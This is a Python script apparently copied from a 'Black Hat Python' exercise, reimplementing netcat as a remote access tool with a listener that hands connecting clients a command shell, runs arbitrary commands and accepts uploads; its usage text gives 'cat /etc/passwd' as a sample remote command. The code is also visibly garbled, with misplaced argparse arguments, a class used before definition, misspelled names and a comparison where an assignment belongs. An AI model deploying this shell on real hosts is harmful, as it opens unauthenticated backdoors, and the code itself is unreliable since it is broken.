#!/usr/bin/python3

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


# Receives command

def execute(cmd):
	cmd = cmd.strip()
	if not cmd:
		return
	output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
	return output.decode()

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='BHP Net Tool')
	formatter_class = argparse.RawDescriptionHelpFormatter,
	epilog = textwrap.dedent('''Example:
		netcat.py -t 191.168.1.4 -p 5555 -l -c # Command Shell
		netcat.py -t 191.168.1.4 -p 5555 -l -u=mytest.txt # Upload to File
		netcat.py -t 191.168.1.4 -p 5555 -l -e=\"cat /etc/passwd\" # Execute Command
		echo 'ABC' | ./netcat.py -t 191.168.1.4 -p 135 # echo text to server port 135
		netcat.py -t 191.168.1.4 -p 5555 # Connect to a server
	''')
parser.add_argument('-c', '--command', action='store_true', help='Command Shell')
parser.add_argument('-e', '--execute', help='Execute Specified Command')
parser.add_argument('-l', '--listen', action='store_true', help='Listen on specified Port')
parser.add_argument('-p', '--port', type=int, default=5555, help='Specify Port(defaults to 5555)')
parser.add_argument('-t', '--target', help='Specify target IP')
parser.add_argument('-u', '--upload', help='Upload File')
args=parser.parse_args()

if args.listen:
	buffer = ''
else:
	buffer = sys.stdin.read()
nc = NetCat(args, buffer.encode())
nc.run()

class NetCat:
	
	def __init__(self, args, buffer=None):
		self.args = args
		self.buffer = buffer
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	def run(self):
		if self.args.listen:
			self.listen()
		else:
			self.send()
	
	def send(self):
		self.socket.connect((self.args.target, self.args.port))
		if self.buffer:
			self.socket.send(self.buffer)

		try:
			while True:
				recv_len = 1
				response = ''
				while recv_len:
					data = self.socket.recv(4096)
					recv_len= len(data)
					response += data.decode()
					if recv_len < 4096:
						break

				if response:
					pritn(response)
					buffer = input('> ')
					buffer += '\n'
					self.socket.send(buffer.encode())
		except KeyboardInterrupt:
			print('User Terminated.')
			self.socket.close()
			sys.exit()

	def listen(self):
		self.socket.bind((self.args.target, self.args.port))
		self.socket.listen(5)

	while True:
		client_socket, = self.socket.accept()
		client_thred = threading.thread(
			target = self.handle, args=(client_socket,)
		)
		client_thread.start()

	def handle(self):
		if self.args.execute:
			output = execute(self.args.execute)
			client_socket.send(output.encode())

		elif self.args.upload:
			file_buffer = b''
			while True:
				data = client_socket.recv(4096)
				if data:
					file_buffer += data
				else:
					break

		elif self.args.command:
			cmd_buffer = b''
			while True:
				try:
					client_socket.send(b'BHP: #> ')
					while '\n' not in cmd_buffer.decode():
						cmd_buffer += client_socket.recv(64)
					response == execute(cmd_buffer.decode())
					if response:
						client_socket.send(response.encode())
					cmd_buffer = b''
				except Exception as e:
					print(f'server killed {e}')
					self.socket.close()
					sys.exit()




